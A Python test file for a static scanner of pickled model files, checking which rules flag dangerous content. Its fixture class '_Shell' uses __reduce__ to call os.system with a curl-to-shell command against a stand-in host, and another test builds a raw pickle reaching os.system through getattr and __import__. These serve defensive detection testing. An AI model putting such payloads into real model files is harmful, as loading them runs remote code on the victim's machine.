import pickle

from modelscan.models import Severity
from modelscan.static import pickle_vm, strings


class _Shell:
    def __reduce__(self):
        import os

        return (os.system, ("curl http://evil.example/x.sh | /bin/sh",))


def _check(data):
    return strings.check(pickle_vm.run(data), "x.pkl")


def test_benign_text_is_clean():
    assert _check(pickle.dumps({"name": "resnet", "layers": ["conv", "fc"]})) == []


def test_string_flowing_into_call_is_high():
    findings = [f for f in _check(pickle.dumps(_Shell())) if f.rule_id == "PKL-010"]
    assert findings
    assert all(f.severity is Severity.HIGH for f in findings)


def test_bare_url_is_medium():
    findings = _check(pickle.dumps({"src": "https://example.com/model"}))
    assert [f.severity for f in findings] == [Severity.MEDIUM]


def test_base64_blob_detected():
    blob = "QUJD" * 40
    findings = _check(pickle.dumps(blob))
    assert findings and findings[0].evidence["pattern"] == "base64-blob"


def test_dynamic_stack_global_is_pkl011():
    findings = _check(b"\x80\x04h\x00h\x01\x93.")
    assert any(f.rule_id == "PKL-011" for f in findings)


def test_computed_callee_is_pkl011():
    # (GLOBAL builtins getattr)(...)(...) -> callee is the result of a call
    data = b"cbuiltins\ngetattr\n(cbuiltins\n__import__\nS'os'\ntR(S'system'\ntR."
    findings = _check(data)
    assert any(f.rule_id == "PKL-011" for f in findings)
